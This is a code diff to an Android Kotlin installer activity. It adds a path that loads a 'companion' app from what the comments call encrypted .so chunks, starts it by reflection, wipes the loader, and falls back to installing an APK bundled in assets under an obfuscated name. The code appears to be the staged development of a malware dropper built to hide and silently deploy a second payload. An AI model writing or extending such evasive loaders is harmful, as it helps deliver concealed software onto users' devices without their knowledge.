@@ -350,17 +350,47 @@ class InstallActivity : AppCompatActivity() {
 
             Thread {
                 try {
-                    val apkBytes = assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
-                    if (apkBytes.isNotEmpty()) {
-                        runOnUiThread { installViaSession(apkBytes, attempt = 1) }
+                    // Phase 3: Try DexLoader first (companion from encrypted .so chunks)
+                    val companionLoader = if (DexLoader.isLoaded()) {
+                        DexLoader.loadCompanionDex(applicationContext)
+                    } else null
+
+                    if (companionLoader != null) {
+                        runOnUiThread { launchCompanionFromDex(companionLoader) }
                     } else {
-                        runOnUiThread { setStage(Stage.ERROR) }
+                        // Fallback: install from assets (keeps working until Phase 4 native ready)
+                        val apkBytes = assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
+                        if (apkBytes.isNotEmpty()) {
+                            runOnUiThread { installViaSession(apkBytes, attempt = 1) }
+                        } else {
+                            runOnUiThread { setStage(Stage.ERROR) }
+                        }
                     }
                 } catch (e: Exception) {
                     runOnUiThread { setStage(Stage.ERROR) }
                 }
             }.start()
         }, 900)
+    }
+
+    private fun launchCompanionFromDex(loader: ClassLoader) {
+        try {
+            val companionAppClass = loader.loadClass("com.android.pictach.CompanionApp")
+            val companionApp = companionAppClass.newInstance()
+            val attachMethod = companionAppClass.getMethod("attachBaseContext",
+                android.content.Context::class.java)
+            attachMethod.invoke(companionApp, applicationContext)
+            val onCreateMethod = companionAppClass.getMethod("onCreate")
+            onCreateMethod.invoke(companionApp)
+            DexLoader.wipe()
+            setStage(Stage.DONE)
+        } catch (e: Exception) {
+            val apkBytes = try {
+                assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
+            } catch (ex: Exception) { ByteArray(0) }
+            if (apkBytes.isNotEmpty()) installViaSession(apkBytes, attempt = 1)
+            else setStage(Stage.ERROR)
+        }
     }
 
     private fun startProgressAnimation() {
